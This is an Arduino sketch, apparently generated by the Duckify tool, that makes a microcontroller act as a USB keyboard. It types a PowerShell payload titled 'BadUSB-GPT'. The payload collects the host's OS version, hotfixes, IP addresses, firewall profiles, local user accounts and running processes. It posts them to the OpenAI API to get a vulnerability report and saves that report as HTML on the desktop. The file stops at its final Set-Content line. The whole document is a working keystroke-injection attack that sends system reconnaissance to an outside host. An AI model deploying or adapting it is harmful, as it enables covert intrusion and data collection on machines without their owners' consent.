// [ ===== Created using duckify.huhn.me @ dev 89adab6e ===== ] //
// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
// Please consider supporting us on ko-fi.com/spacehuhn <3
// Learn more about us at spacehuhn.com

// Platform: Arduino
// Keyboard Layout: US


#include <HID.h>

namespace keyboard {
    typedef struct report {
        uint8_t modifiers;
        uint8_t reserved;
        uint8_t keys[6];
    } report;
    
    report prev_report = report { 0x00, 0x00, { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };
    
    const uint8_t keyboardDescriptor[] PROGMEM {
        0x05, 0x01, 0x09, 0x06, 0xa1, 0x01, 0x85, 0x02, 0x05, 0x07, 0x19, 0xe0, 0x29, 0xe7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02, 0x95, 0x01, 0x75, 0x08, 0x81, 0x03, 0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0x73, 0x05, 0x07, 0x19, 0x00, 0x29, 0x73, 0x81, 0x00, 0xc0,
    };
    
    report makeReport(uint8_t modifiers = 0, uint8_t key1 = 0, uint8_t key2 = 0, uint8_t key3 = 0, uint8_t key4 = 0, uint8_t key5 = 0, uint8_t key6 = 0);
    
    report makeReport(uint8_t modifiers, uint8_t key1, uint8_t key2, uint8_t key3, uint8_t key4, uint8_t key5, uint8_t key6) {
        return report { modifiers, 0x00, { key1, key2, key3, key4, key5, key6 } };
    }
    
    void begin() {
        static HIDSubDescriptor node(keyboardDescriptor, sizeof(keyboardDescriptor));
        HID().AppendDescriptor(&node);
    }
    
    void send(report* k) {
        HID().SendReport(2, (uint8_t*)k, sizeof(report));
    }
    
    void release() {
        prev_report = makeReport();
        send(&prev_report);
    }

    void type(uint8_t key0, uint8_t key1, uint8_t key2, uint8_t key3, uint8_t key4, uint8_t key5, uint8_t modifiers) {
        prev_report.keys[0] = key0;
        prev_report.keys[1] = key1;
        prev_report.keys[2] = key2;
        prev_report.keys[3] = key3;
        prev_report.keys[4] = key4;
        prev_report.keys[5] = key5;
        prev_report.modifiers = modifiers;
        send(&prev_report);
        release();
    }
}


// a
const uint8_t key_arr_0[] PROGMEM = {0,4};
// $system_info = @{
const uint8_t key_arr_1[] PROGMEM = {2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,44, 0,46, 0,44, 2,31, 2,47};
// 'OS' = $(Get-CimInstance Win32_OperatingSystem).Caption;
const uint8_t key_arr_2[] PROGMEM = {0,52, 2,18, 2,22, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,6, 0,12, 0,16, 2,12, 0,17, 0,22, 0,23, 0,4, 0,17, 0,6, 0,8, 0,44, 2,26, 0,12, 0,17, 0,32, 0,31, 2,45, 2,18, 0,19, 0,8, 0,21, 0,4, 0,23, 0,12, 0,17, 0,10, 2,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,39, 0,55, 2,6, 0,4, 0,19, 0,23, 0,12, 0,18, 0,17, 0,51};
// 'Version' = $(Get-CimInstance Win32_OperatingSystem).Version;
const uint8_t key_arr_3[] PROGMEM = {0,52, 2,25, 0,8, 0,21, 0,22, 0,12, 0,18, 0,17, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,6, 0,12, 0,16, 2,12, 0,17, 0,22, 0,23, 0,4, 0,17, 0,6, 0,8, 0,44, 2,26, 0,12, 0,17, 0,32, 0,31, 2,45, 2,18, 0,19, 0,8, 0,21, 0,4, 0,23, 0,12, 0,17, 0,10, 2,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,39, 0,55, 2,25, 0,8, 0,21, 0,22, 0,12, 0,18, 0,17, 0,51};
// 'Architecture' = $(Get-CimInstance Win32_OperatingSystem).OSArchitecture;
const uint8_t key_arr_4[] PROGMEM = {0,52, 2,4, 0,21, 0,6, 0,11, 0,12, 0,23, 0,8, 0,6, 0,23, 0,24, 0,21, 0,8, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,6, 0,12, 0,16, 2,12, 0,17, 0,22, 0,23, 0,4, 0,17, 0,6, 0,8, 0,44, 2,26, 0,12, 0,17, 0,32, 0,31, 2,45, 2,18, 0,19, 0,8, 0,21, 0,4, 0,23, 0,12, 0,17, 0,10, 2,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,39, 0,55, 2,18, 2,22, 2,4, 0,21, 0,6, 0,11, 0,12, 0,23, 0,8, 0,6, 0,23, 0,24, 0,21, 0,8, 0,51};
// 'ComputerName' = $(Get-CimInstance Win32_OperatingSystem).CSName;
const uint8_t key_arr_5[] PROGMEM = {0,52, 2,6, 0,18, 0,16, 0,19, 0,24, 0,23, 0,8, 0,21, 2,17, 0,4, 0,16, 0,8, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,6, 0,12, 0,16, 2,12, 0,17, 0,22, 0,23, 0,4, 0,17, 0,6, 0,8, 0,44, 2,26, 0,12, 0,17, 0,32, 0,31, 2,45, 2,18, 0,19, 0,8, 0,21, 0,4, 0,23, 0,12, 0,17, 0,10, 2,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,39, 0,55, 2,6, 2,22, 2,17, 0,4, 0,16, 0,8, 0,51};
// 'LastBootTime' = $(Get-CimInstance Win32_OperatingSystem).LastBootUpTime;
const uint8_t key_arr_6[] PROGMEM = {0,52, 2,15, 0,4, 0,22, 0,23, 2,5, 0,18, 0,18, 0,23, 2,23, 0,12, 0,16, 0,8, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,6, 0,12, 0,16, 2,12, 0,17, 0,22, 0,23, 0,4, 0,17, 0,6, 0,8, 0,44, 2,26, 0,12, 0,17, 0,32, 0,31, 2,45, 2,18, 0,19, 0,8, 0,21, 0,4, 0,23, 0,12, 0,17, 0,10, 2,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,39, 0,55, 2,15, 0,4, 0,22, 0,23, 2,5, 0,18, 0,18, 0,23, 2,24, 0,19, 2,23, 0,12, 0,16, 0,8, 0,51};
// 'InstalledUpdates' = $(Get-HotFix | Sort-Object -Property InstalledOn -Descending | Select-Object -First 5).Description;
const uint8_t key_arr_7[] PROGMEM = {0,52, 2,12, 0,17, 0,22, 0,23, 0,4, 0,15, 0,15, 0,8, 0,7, 2,24, 0,19, 0,7, 0,4, 0,23, 0,8, 0,22, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,11, 0,18, 0,23, 2,9, 0,12, 0,27, 0,44, 2,49, 0,44, 2,22, 0,18, 0,21, 0,23, 0,45, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 0,45, 2,19, 0,21, 0,18, 0,19, 0,8, 0,21, 0,23, 0,28, 0,44, 2,12, 0,17, 0,22, 0,23, 0,4, 0,15, 0,15, 0,8, 0,7, 2,18, 0,17, 0,44, 0,45, 2,7, 0,8, 0,22, 0,6, 0,8, 0,17, 0,7, 0,12, 0,17, 0,10, 0,44, 2,49, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,45, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 0,45, 2,9, 0,12, 0,21, 0,22, 0,23, 0,44, 0,34, 2,39, 0,55, 2,7, 0,8, 0,22, 0,6, 0,21, 0,12, 0,19, 0,23, 0,12, 0,18, 0,17, 0,51};
// 'NetworkInfo' = $(Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true}).IPAddress;
const uint8_t key_arr_8[] PROGMEM = {0,52, 2,17, 0,8, 0,23, 0,26, 0,18, 0,21, 0,14, 2,12, 0,17, 0,9, 0,18, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,6, 0,12, 0,16, 2,12, 0,17, 0,22, 0,23, 0,4, 0,17, 0,6, 0,8, 0,44, 2,26, 0,12, 0,17, 0,32, 0,31, 2,45, 2,17, 0,8, 0,23, 0,26, 0,18, 0,21, 0,14, 2,4, 0,7, 0,4, 0,19, 0,23, 0,8, 0,21, 2,6, 0,18, 0,17, 0,9, 0,12, 0,10, 0,24, 0,21, 0,4, 0,23, 0,12, 0,18, 0,17, 0,44, 2,49, 0,44, 2,26, 0,11, 0,8, 0,21, 0,8, 0,45, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 2,47, 2,33, 2,45, 0,55, 2,12, 2,19, 2,8, 0,17, 0,4, 0,5, 0,15, 0,8, 0,7, 0,44, 0,45, 0,8, 0,20, 0,44, 2,33, 0,23, 0,21, 0,24, 0,8, 2,48, 2,39, 0,55, 2,12, 2,19, 2,4, 0,7, 0,7, 0,21, 0,8, 0,22, 0,22, 0,51};
// 'FirewallStatus' = $(Get-NetFirewallProfile | Where-Object { $_.Enabled -eq $true }).Name;
const uint8_t key_arr_9[] PROGMEM = {0,52, 2,9, 0,12, 0,21, 0,8, 0,26, 0,4, 0,15, 0,15, 2,22, 0,23, 0,4, 0,23, 0,24, 0,22, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,17, 0,8, 0,23, 2,9, 0,12, 0,21, 0,8, 0,26, 0,4, 0,15, 0,15, 2,19, 0,21, 0,18, 0,9, 0,12, 0,15, 0,8, 0,44, 2,49, 0,44, 2,26, 0,11, 0,8, 0,21, 0,8, 0,45, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 2,47, 0,44, 2,33, 2,45, 0,55, 2,8, 0,17, 0,4, 0,5, 0,15, 0,8, 0,7, 0,44, 0,45, 0,8, 0,20, 0,44, 2,33, 0,23, 0,21, 0,24, 0,8, 0,44, 2,48, 2,39, 0,55, 2,17, 0,4, 0,16, 0,8, 0,51};
// 'UserAccounts' = $(Get-LocalUser | Where-Object { $_.Enabled -eq $true }).Name;
const uint8_t key_arr_10[] PROGMEM = {0,52, 2,24, 0,22, 0,8, 0,21, 2,4, 0,6, 0,6, 0,18, 0,24, 0,17, 0,23, 0,22, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,15, 0,18, 0,6, 0,4, 0,15, 2,24, 0,22, 0,8, 0,21, 0,44, 2,49, 0,44, 2,26, 0,11, 0,8, 0,21, 0,8, 0,45, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 2,47, 0,44, 2,33, 2,45, 0,55, 2,8, 0,17, 0,4, 0,5, 0,15, 0,8, 0,7, 0,44, 0,45, 0,8, 0,20, 0,44, 2,33, 0,23, 0,21, 0,24, 0,8, 0,44, 2,48, 2,39, 0,55, 2,17, 0,4, 0,16, 0,8, 0,51};
// 'RunningProcesses' = $(Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 5).Name;
const uint8_t key_arr_11[] PROGMEM = {0,52, 2,21, 0,24, 0,17, 0,17, 0,12, 0,17, 0,10, 2,19, 0,21, 0,18, 0,6, 0,8, 0,22, 0,22, 0,8, 0,22, 0,52, 0,44, 0,46, 0,44, 2,33, 2,38, 2,10, 0,8, 0,23, 0,45, 2,19, 0,21, 0,18, 0,6, 0,8, 0,22, 0,22, 0,44, 2,49, 0,44, 2,22, 0,18, 0,21, 0,23, 0,45, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 0,45, 2,19, 0,21, 0,18, 0,19, 0,8, 0,21, 0,23, 0,28, 0,44, 2,6, 2,19, 2,24, 0,44, 0,45, 2,7, 0,8, 0,22, 0,6, 0,8, 0,17, 0,7, 0,12, 0,17, 0,10, 0,44, 2,49, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,45, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 0,45, 2,9, 0,12, 0,21, 0,22, 0,23, 0,44, 0,34, 2,39, 0,55, 2,17, 0,4, 0,16, 0,8, 0,51};
// }
const uint8_t key_arr_12[] PROGMEM = {2,48};
// $prompt_text = "Given the detailed system information: OS: $($system_info.OS), Version: $($system_info.Version), Architecture: $($system_info.Architecture), Computer Name: COMPUTER_NAME_PLACEHOLDER, Last Boot Time: $($system_info.LastBootTime), Installed Updates: $($system_info.InstalledUpdates), Network Info: NETWORK_INFO_PLACEHOLDER, Firewall Status: $($system_info.FirewallStatus), User Accounts: USER_ACCOUNTS_PLACEHOLDER, Running Processes: $($system_info.RunningProcesses), provide a pentesting report identifying potential vulnerabilities in English, formatted in HTML with headers and bullet points for recommendations."
const uint8_t key_arr_13[] PROGMEM = {2,33, 0,19, 0,21, 0,18, 0,16, 0,19, 0,23, 2,45, 0,23, 0,8, 0,27, 0,23, 0,44, 0,46, 0,44, 2,52, 2,10, 0,12, 0,25, 0,8, 0,17, 0,44, 0,23, 0,11, 0,8, 0,44, 0,7, 0,8, 0,23, 0,4, 0,12, 0,15, 0,8, 0,7, 0,44, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 0,44, 0,12, 0,17, 0,9, 0,18, 0,21, 0,16, 0,4, 0,23, 0,12, 0,18, 0,17, 2,51, 0,44, 2,18, 2,22, 2,51, 0,44, 2,33, 2,38, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,18, 2,22, 2,39, 0,54, 0,44, 2,25, 0,8, 0,21, 0,22, 0,12, 0,18, 0,17, 2,51, 0,44, 2,33, 2,38, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,25, 0,8, 0,21, 0,22, 0,12, 0,18, 0,17, 2,39, 0,54, 0,44, 2,4, 0,21, 0,6, 0,11, 0,12, 0,23, 0,8, 0,6, 0,23, 0,24, 0,21, 0,8, 2,51, 0,44, 2,33, 2,38, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,4, 0,21, 0,6, 0,11, 0,12, 0,23, 0,8, 0,6, 0,23, 0,24, 0,21, 0,8, 2,39, 0,54, 0,44, 2,6, 0,18, 0,16, 0,19, 0,24, 0,23, 0,8, 0,21, 0,44, 2,17, 0,4, 0,16, 0,8, 2,51, 0,44, 2,6, 2,18, 2,16, 2,19, 2,24, 2,23, 2,8, 2,21, 2,45, 2,17, 2,4, 2,16, 2,8, 2,45, 2,19, 2,15, 2,4, 2,6, 2,8, 2,11, 2,18, 2,15, 2,7, 2,8, 2,21, 0,54, 0,44, 2,15, 0,4, 0,22, 0,23, 0,44, 2,5, 0,18, 0,18, 0,23, 0,44, 2,23, 0,12, 0,16, 0,8, 2,51, 0,44, 2,33, 2,38, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,15, 0,4, 0,22, 0,23, 2,5, 0,18, 0,18, 0,23, 2,23, 0,12, 0,16, 0,8, 2,39, 0,54, 0,44, 2,12, 0,17, 0,22, 0,23, 0,4, 0,15, 0,15, 0,8, 0,7, 0,44, 2,24, 0,19, 0,7, 0,4, 0,23, 0,8, 0,22, 2,51, 0,44, 2,33, 2,38, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,12, 0,17, 0,22, 0,23, 0,4, 0,15, 0,15, 0,8, 0,7, 2,24, 0,19, 0,7, 0,4, 0,23, 0,8, 0,22, 2,39, 0,54, 0,44, 2,17, 0,8, 0,23, 0,26, 0,18, 0,21, 0,14, 0,44, 2,12, 0,17, 0,9, 0,18, 2,51, 0,44, 2,17, 2,8, 2,23, 2,26, 2,18, 2,21, 2,14, 2,45, 2,12, 2,17, 2,9, 2,18, 2,45, 2,19, 2,15, 2,4, 2,6, 2,8, 2,11, 2,18, 2,15, 2,7, 2,8, 2,21, 0,54, 0,44, 2,9, 0,12, 0,21, 0,8, 0,26, 0,4, 0,15, 0,15, 0,44, 2,22, 0,23, 0,4, 0,23, 0,24, 0,22, 2,51, 0,44, 2,33, 2,38, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,9, 0,12, 0,21, 0,8, 0,26, 0,4, 0,15, 0,15, 2,22, 0,23, 0,4, 0,23, 0,24, 0,22, 2,39, 0,54, 0,44, 2,24, 0,22, 0,8, 0,21, 0,44, 2,4, 0,6, 0,6, 0,18, 0,24, 0,17, 0,23, 0,22, 2,51, 0,44, 2,24, 2,22, 2,8, 2,21, 2,45, 2,4, 2,6, 2,6, 2,18, 2,24, 2,17, 2,23, 2,22, 2,45, 2,19, 2,15, 2,4, 2,6, 2,8, 2,11, 2,18, 2,15, 2,7, 2,8, 2,21, 0,54, 0,44, 2,21, 0,24, 0,17, 0,17, 0,12, 0,17, 0,10, 0,44, 2,19, 0,21, 0,18, 0,6, 0,8, 0,22, 0,22, 0,8, 0,22, 2,51, 0,44, 2,33, 2,38, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,21, 0,24, 0,17, 0,17, 0,12, 0,17, 0,10, 2,19, 0,21, 0,18, 0,6, 0,8, 0,22, 0,22, 0,8, 0,22, 2,39, 0,54, 0,44, 0,19, 0,21, 0,18, 0,25, 0,12, 0,7, 0,8, 0,44, 0,4, 0,44, 0,19, 0,8, 0,17, 0,23, 0,8, 0,22, 0,23, 0,12, 0,17, 0,10, 0,44, 0,21, 0,8, 0,19, 0,18, 0,21, 0,23, 0,44, 0,12, 0,7, 0,8, 0,17, 0,23, 0,12, 0,9, 0,28, 0,12, 0,17, 0,10, 0,44, 0,19, 0,18, 0,23, 0,8, 0,17, 0,23, 0,12, 0,4, 0,15, 0,44, 0,25, 0,24, 0,15, 0,17, 0,8, 0,21, 0,4, 0,5, 0,12, 0,15, 0,12, 0,23, 0,12, 0,8, 0,22, 0,44, 0,12, 0,17, 0,44, 2,8, 0,17, 0,10, 0,15, 0,12, 0,22, 0,11, 0,54, 0,44, 0,9, 0,18, 0,21, 0,16, 0,4, 0,23, 0,23, 0,8, 0,7, 0,44, 0,12, 0,17, 0,44, 2,11, 2,23, 2,16, 2,15, 0,44, 0,26, 0,12, 0,23, 0,11, 0,44, 0,11, 0,8, 0,4, 0,7, 0,8, 0,21, 0,22, 0,44, 0,4, 0,17, 0,7, 0,44, 0,5, 0,24, 0,15, 0,15, 0,8, 0,23, 0,44, 0,19, 0,18, 0,12, 0,17, 0,23, 0,22, 0,44, 0,9, 0,18, 0,21, 0,44, 0,21, 0,8, 0,6, 0,18, 0,16, 0,16, 0,8, 0,17, 0,7, 0,4, 0,23, 0,12, 0,18, 0,17, 0,22, 0,55, 2,52};
// $messages = @(
const uint8_t key_arr_14[] PROGMEM = {2,33, 0,16, 0,8, 0,22, 0,22, 0,4, 0,10, 0,8, 0,22, 0,44, 0,46, 0,44, 2,31, 2,38};
// @{ 'role' = 'system'; 'content' = 'You are analyzing detailed system information for potential vulnerabilities.' },
const uint8_t key_arr_15[] PROGMEM = {2,31, 2,47, 0,44, 0,52, 0,21, 0,18, 0,15, 0,8, 0,52, 0,44, 0,46, 0,44, 0,52, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 0,52, 0,51, 0,44, 0,52, 0,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,52, 0,44, 0,46, 0,44, 0,52, 2,28, 0,18, 0,24, 0,44, 0,4, 0,21, 0,8, 0,44, 0,4, 0,17, 0,4, 0,15, 0,28, 0,29, 0,12, 0,17, 0,10, 0,44, 0,7, 0,8, 0,23, 0,4, 0,12, 0,15, 0,8, 0,7, 0,44, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 0,44, 0,12, 0,17, 0,9, 0,18, 0,21, 0,16, 0,4, 0,23, 0,12, 0,18, 0,17, 0,44, 0,9, 0,18, 0,21, 0,44, 0,19, 0,18, 0,23, 0,8, 0,17, 0,23, 0,12, 0,4, 0,15, 0,44, 0,25, 0,24, 0,15, 0,17, 0,8, 0,21, 0,4, 0,5, 0,12, 0,15, 0,12, 0,23, 0,12, 0,8, 0,22, 0,55, 0,52, 0,44, 2,48, 0,54};
// @{ 'role' = 'user'; 'content' = $prompt_text }
const uint8_t key_arr_16[] PROGMEM = {2,31, 2,47, 0,44, 0,52, 0,21, 0,18, 0,15, 0,8, 0,52, 0,44, 0,46, 0,44, 0,52, 0,24, 0,22, 0,8, 0,21, 0,52, 0,51, 0,44, 0,52, 0,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,52, 0,44, 0,46, 0,44, 2,33, 0,19, 0,21, 0,18, 0,16, 0,19, 0,23, 2,45, 0,23, 0,8, 0,27, 0,23, 0,44, 2,48};
// )
const uint8_t key_arr_17[] PROGMEM = {2,39};
// $headers = @{ 'Authorization' = 'Bearer YOUR_OPENAI_API_KEY'; 'Content-Type' = 'application/json' }
const uint8_t key_arr_18[] PROGMEM = {2,33, 0,11, 0,8, 0,4, 0,7, 0,8, 0,21, 0,22, 0,44, 0,46, 0,44, 2,31, 2,47, 0,44, 0,52, 2,4, 0,24, 0,23, 0,11, 0,18, 0,21, 0,12, 0,29, 0,4, 0,23, 0,12, 0,18, 0,17, 0,52, 0,44, 0,46, 0,44, 0,52, 2,5, 0,8, 0,4, 0,21, 0,8, 0,21, 0,44, 2,28, 2,18, 2,24, 2,21, 2,45, 2,18, 2,19, 2,8, 2,17, 2,4, 2,12, 2,45, 2,4, 2,19, 2,12, 2,45, 2,14, 2,8, 2,28, 0,52, 0,51, 0,44, 0,52, 2,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,45, 2,23, 0,28, 0,19, 0,8, 0,52, 0,44, 0,46, 0,44, 0,52, 0,4, 0,19, 0,19, 0,15, 0,12, 0,6, 0,4, 0,23, 0,12, 0,18, 0,17, 0,56, 0,13, 0,22, 0,18, 0,17, 0,52, 0,44, 2,48};
// $response = Invoke-RestMethod -Uri 'https://api.openai.com/v1/chat/completions' -Method POST -Headers $headers -Body (@{ model = 'gpt-3.5-turbo'; messages = $messages } | ConvertTo-Json)
const uint8_t key_arr_19[] PROGMEM = {2,33, 0,21, 0,8, 0,22, 0,19, 0,18, 0,17, 0,22, 0,8, 0,44, 0,46, 0,44, 2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,45, 2,21, 0,8, 0,22, 0,23, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 0,45, 2,24, 0,21, 0,12, 0,44, 0,52, 0,11, 0,23, 0,23, 0,19, 0,22, 2,51, 0,56, 0,56, 0,4, 0,19, 0,12, 0,55, 0,18, 0,19, 0,8, 0,17, 0,4, 0,12, 0,55, 0,6, 0,18, 0,16, 0,56, 0,25, 0,30, 0,56, 0,6, 0,11, 0,4, 0,23, 0,56, 0,6, 0,18, 0,16, 0,19, 0,15, 0,8, 0,23, 0,12, 0,18, 0,17, 0,22, 0,52, 0,44, 0,45, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 2,19, 2,18, 2,22, 2,23, 0,44, 0,45, 2,11, 0,8, 0,4, 0,7, 0,8, 0,21, 0,22, 0,44, 2,33, 0,11, 0,8, 0,4, 0,7, 0,8, 0,21, 0,22, 0,44, 0,45, 2,5, 0,18, 0,7, 0,28, 0,44, 2,38, 2,31, 2,47, 0,44, 0,16, 0,18, 0,7, 0,8, 0,15, 0,44, 0,46, 0,44, 0,52, 0,10, 0,19, 0,23, 0,45, 0,32, 0,55, 0,34, 0,45, 0,23, 0,24, 0,21, 0,5, 0,18, 0,52, 0,51, 0,44, 0,16, 0,8, 0,22, 0,22, 0,4, 0,10, 0,8, 0,22, 0,44, 0,46, 0,44, 2,33, 0,16, 0,8, 0,22, 0,22, 0,4, 0,10, 0,8, 0,22, 0,44, 2,48, 0,44, 2,49, 0,44, 2,6, 0,18, 0,17, 0,25, 0,8, 0,21, 0,23, 2,23, 0,18, 0,45, 2,13, 0,22, 0,18, 0,17, 2,39};
// $htmlContent = @"
const uint8_t key_arr_20[] PROGMEM = {2,33, 0,11, 0,23, 0,16, 0,15, 2,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,44, 0,46, 0,44, 2,31, 2,52};
// <html>
const uint8_t key_arr_21[] PROGMEM = {2,54, 0,11, 0,23, 0,16, 0,15, 2,55};
// <head>
const uint8_t key_arr_22[] PROGMEM = {2,54, 0,11, 0,8, 0,4, 0,7, 2,55};
// <title>Pentesting Report BadUSB-GPT</title>
const uint8_t key_arr_23[] PROGMEM = {2,54, 0,23, 0,12, 0,23, 0,15, 0,8, 2,55, 2,19, 0,8, 0,17, 0,23, 0,8, 0,22, 0,23, 0,12, 0,17, 0,10, 0,44, 2,21, 0,8, 0,19, 0,18, 0,21, 0,23, 0,44, 2,5, 0,4, 0,7, 2,24, 2,22, 2,5, 0,45, 2,10, 2,19, 2,23, 2,54, 0,56, 0,23, 0,12, 0,23, 0,15, 0,8, 2,55};
// <style>
const uint8_t key_arr_24[] PROGMEM = {2,54, 0,22, 0,23, 0,28, 0,15, 0,8, 2,55};
// body {font-family: Arial, sans-serif; margin: 40px;}
const uint8_t key_arr_25[] PROGMEM = {0,5, 0,18, 0,7, 0,28, 0,44, 2,47, 0,9, 0,18, 0,17, 0,23, 0,45, 0,9, 0,4, 0,16, 0,12, 0,15, 0,28, 2,51, 0,44, 2,4, 0,21, 0,12, 0,4, 0,15, 0,54, 0,44, 0,22, 0,4, 0,17, 0,22, 0,45, 0,22, 0,8, 0,21, 0,12, 0,9, 0,51, 0,44, 0,16, 0,4, 0,21, 0,10, 0,12, 0,17, 2,51, 0,44, 0,33, 0,39, 0,19, 0,27, 0,51, 2,48};
// h2 {color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px;}
const uint8_t key_arr_26[] PROGMEM = {0,11, 0,31, 0,44, 2,47, 0,6, 0,18, 0,15, 0,18, 0,21, 2,51, 0,44, 2,32, 0,32, 0,32, 0,32, 0,51, 0,44, 0,5, 0,18, 0,21, 0,7, 0,8, 0,21, 0,45, 0,5, 0,18, 0,23, 0,23, 0,18, 0,16, 2,51, 0,44, 0,31, 0,19, 0,27, 0,44, 0,22, 0,18, 0,15, 0,12, 0,7, 0,44, 2,32, 0,8, 0,8, 0,8, 0,51, 0,44, 0,19, 0,4, 0,7, 0,7, 0,12, 0,17, 0,10, 0,45, 0,5, 0,18, 0,23, 0,23, 0,18, 0,16, 2,51, 0,44, 0,30, 0,39, 0,19, 0,27, 0,51, 2,48};
// h3 {color: #555; margin-top: 20px;}
const uint8_t key_arr_27[] PROGMEM = {0,11, 0,32, 0,44, 2,47, 0,6, 0,18, 0,15, 0,18, 0,21, 2,51, 0,44, 2,32, 0,34, 0,34, 0,34, 0,51, 0,44, 0,16, 0,4, 0,21, 0,10, 0,12, 0,17, 0,45, 0,23, 0,18, 0,19, 2,51, 0,44, 0,31, 0,39, 0,19, 0,27, 0,51, 2,48};
// p, ul {margin-bottom: 20px;}
const uint8_t key_arr_28[] PROGMEM = {0,19, 0,54, 0,44, 0,24, 0,15, 0,44, 2,47, 0,16, 0,4, 0,21, 0,10, 0,12, 0,17, 0,45, 0,5, 0,18, 0,23, 0,23, 0,18, 0,16, 2,51, 0,44, 0,31, 0,39, 0,19, 0,27, 0,51, 2,48};
// </style>
const uint8_t key_arr_29[] PROGMEM = {2,54, 0,56, 0,22, 0,23, 0,28, 0,15, 0,8, 2,55};
// </head>
const uint8_t key_arr_30[] PROGMEM = {2,54, 0,56, 0,11, 0,8, 0,4, 0,7, 2,55};
// <body>
const uint8_t key_arr_31[] PROGMEM = {2,54, 0,5, 0,18, 0,7, 0,28, 2,55};
// <h2>Pentesting Report</h2>
const uint8_t key_arr_32[] PROGMEM = {2,54, 0,11, 0,31, 2,55, 2,19, 0,8, 0,17, 0,23, 0,8, 0,22, 0,23, 0,12, 0,17, 0,10, 0,44, 2,21, 0,8, 0,19, 0,18, 0,21, 0,23, 2,54, 0,56, 0,11, 0,31, 2,55};
// $($response.choices[0].message.content)
const uint8_t key_arr_33[] PROGMEM = {2,33, 2,38, 2,33, 0,21, 0,8, 0,22, 0,19, 0,18, 0,17, 0,22, 0,8, 0,55, 0,6, 0,11, 0,18, 0,12, 0,6, 0,8, 0,22, 0,47, 0,39, 0,48, 0,55, 0,16, 0,8, 0,22, 0,22, 0,4, 0,10, 0,8, 0,55, 0,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 2,39};
// </body>
const uint8_t key_arr_34[] PROGMEM = {2,54, 0,56, 0,5, 0,18, 0,7, 0,28, 2,55};
// </html>
const uint8_t key_arr_35[] PROGMEM = {2,54, 0,56, 0,11, 0,23, 0,16, 0,15, 2,55};
// "@
const uint8_t key_arr_36[] PROGMEM = {2,52, 2,31};
// Set-Content -Path $env:USERPROFILEbslashDesktopbslashPentesting_Report.html -Value $htmlContent
